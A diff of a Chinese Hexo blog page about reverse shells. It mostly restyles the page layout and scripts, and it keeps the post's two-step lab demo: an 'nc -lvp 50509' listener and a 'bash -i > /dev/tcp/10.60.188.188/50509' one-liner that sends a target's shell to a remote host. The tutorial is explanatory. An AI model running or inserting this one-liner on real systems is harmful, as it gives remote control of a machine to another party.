@@ -62,6 +62,25 @@
   <script src="/js/prettify.js"></script>
   <link rel="stylesheet" href="/css/tomorrow_night.css">
   <link rel="stylesheet" href="/css/tomorrow_night.min.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <script>
+    Date.prototype.Format = function (fmt) {
+      var o = {
+              "M+": this.getMonth() + 1, // 月份
+              "d+": this.getDate(), // 日
+              "h+": this.getHours(), // 小时
+              "m+": this.getMinutes(), // 分
+              "s+": this.getSeconds(), // 秒
+              "q+": Math.floor((this.getMonth() + 3) / 3), // 季度
+              "S": this.getMilliseconds() // 毫秒
+      };
+      if (/(y+)/.test(fmt))
+          fmt = fmt.replace(RegExp.$1, (this.getFullYear() + ""));
+      for (var k in o)
+          if (new RegExp("(" + k + ")").test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length == 1) ? (o[k]) : (("00" + o[k]).substr(("" + o[k]).length)));
+      return fmt;
+    }
+  </script>
 <meta name="generator" content="Hexo 4.2.1"></head>
 </head>
 
@@ -81,16 +100,25 @@
     </div>
   </nav>
   <div class="page-container">
-    <div style="float:right">
-      <span>
-        <em class="post-meta-item-text">Author:Yake Pei,</em>
+  <h1 id="反向shell" class="page_title">
+    <a href="#反向shell" class="headerlink" title="反向shell"></a>
+    反向shell
+  </h1>
+  <div>
+    <em class="page_meta">Written by </em>
+    <a itemprop="name" href="http://peiyake.com" rel="author">Yake Pei</a> 
+    <em class="page_meta">,Last update
+      <span class="post-time">on 
+        <time datetime="1592824242000" itemprop="datePublished"><script>var date = new Date().Format('yy-MM-dd hh:mm');document.write(date);</script></time>
       </span>
-      <span id="/2020/06/22/shell/fanxiang_shell/" class="leancloud_visitors" data-flag-title="反向shell">
-        <em class="post-meta-item-text">Pageviews:</em>
-        <i class="leancloud-visitors-count">loading</i>
-      </span>
-    </div>
-  <h1 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h1><h2 id="什么是反向shell"><a href="#什么是反向shell" class="headerlink" title="什么是反向shell"></a>什么是反向shell</h2><blockquote>
+    </em>
+    <span id="/2020/06/22/shell/fanxiang_shell/" class="leancloud_visitors" data-flag-title="反向shell">
+      <em class="post-meta-item-text" style="color:#55555587 !important">,Pageviews:</em>
+      <i class="leancloud-visitors-count">loading</i>
+    </span>
+  </div>
+  <hr style="margin-top: 0;border:1;border-top:1px solid #b0a71d !important">
+  <blockquote>
 <p><a href="https://baike.baidu.com/item/%E5%8F%8D%E5%90%91shell/16751835?fr=aladdin">反向shell</a>的工作方式是远程计算机将自己的shell发送给特定的用户，而不是将shell绑定到一个端口上。后者在很多环境中是无法访问的。这样，你就可以对远程服务器执行root命令。</p>
 </blockquote>
 <h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
@@ -100,14 +128,10 @@
 <h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><ol>
 <li>控制端执行</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~#: nc -lvp 50509       &#x2F;&#x2F;监听一个tcp端口 50509</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
+<pre><code>    ~#: nc -lvp 50509       //监听一个tcp端口 50509</code></pre><ol start="2">
 <li>被控制端执行</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~#:bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.60.188.188&#x2F;50509 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
+<pre><code>    ~#:bash -i &gt; /dev/tcp/10.60.188.188/50509 0&gt;&amp;1 2&gt;&amp;1</code></pre><ol start="3">
 <li>执行后，在控制端会进入一个 <code>被控端</code> 的命令行shell 。 可以执行一切命令，就相当于登录进 <code>被控制端一样</code></li>
 </ol>
 <p>效果图：</p>
@@ -125,6 +149,18 @@
     var dom = document.getElementsByClassName('code');
     for(var i=0,len=dom.length; i<len; i++){
       dom[i].style.width = '750px';
+    }
+    var dom = document.getElementsByTagName('h1');
+    for(var i=0,len=dom.length; i<len; i++){
+      dom[i].className  += 'page_title';
+    }
+    var dom = document.getElementsByTagName('p');
+    for(var i=0,len=dom.length; i<len; i++){
+      dom[i].style.color = '#303333';
+    }
+    var dom = document.getElementsByTagName('a');
+    for(var i=0,len=dom.length; i<len; i++){
+      dom[i].style.color = '#2d96bd';
     }
   </script>
 
